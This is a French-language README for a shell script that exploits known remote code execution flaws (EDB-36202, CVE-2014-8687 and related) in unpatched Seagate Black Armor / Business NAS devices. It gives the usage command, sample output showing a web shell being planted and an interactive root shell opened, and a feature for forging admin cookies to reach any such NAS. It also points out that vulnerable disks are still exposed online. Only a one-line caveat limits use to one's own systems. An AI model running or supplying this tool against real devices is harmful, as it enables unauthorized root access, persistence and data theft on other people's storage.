# Seagate Black Armor Raper

# DESCRIPTION:
 - Ce script execute exploite une vulnerabilité des disque Seagate Black Armor d'une certaine version.
 - Il demeure encore des disque ouvert à internet et qui ne sont toujours pas mis-à-jour.

# EXPLOIT/VULNERABILITE:
 - EDB-ID:36202		Seagate Business NAS 2014.00319 - Remote Code Execution
 - CVE-2014-8687		Arbitrary Code Execution
 - CVE-2014-8684: 	timing attacks and object injection.
 - CVE-2014-8686: 	a fall-back to the _xor_encode() method of session encryption.

# VERSIONS VULNERABLES:
 - 2014.00319
 - 2013.60311

# UTILISATION:
 - sbar.sh IP PORT
 - Exemple:
 - sbar.sh 127.45.63.89 7009


   - Establishing session with 127.45.63.89 ...
   - Configuring administrative access ...
   - Installing web shell (takes a while) ...
   - Extracting id and hostname ...

   - Seagape v1.0 -- Interactive Seagate NAS Webshell
   -   - OJ Reeves (@TheColonial) - https://beyondbinary.io/
   -   - https://beyondbinary.io/bbsec/001

   - version           - Print the current firmware version to screen.
   - dumpcookie        - Print the current cookie to screen.
   - admincookie <ua>  - Create an admin login cookie (ua == user agent string).
   -                     Add to your browser and access ANY NAS box as admin.
   - help              - Show this help.
   - exit / quit       - Run for the hills.
   - <anything else>   - Execute the command on the server.

   - Seagape (root@WKNAS)>




# EXPLOITATION:
 - Generation/creation de cookie admin et authentificagtion à l'interface d'administration en tant qu'administrateur.
 - Ouverture d'un shell root sur le disque avec accès à la racine du disque

# ATTENTION:
 - N'utiliser que sur ses propres infrastructures
 - Laisse des traces et des fichiers.

# LIENS EXTERNES:
 - https://nvd.nist.gov/vuln/detail/CVE-2014-8687
 - https://beyondbinary.io/articles/seagate-nas-rce/
 - https://www.exploit-db.com/exploits/36202


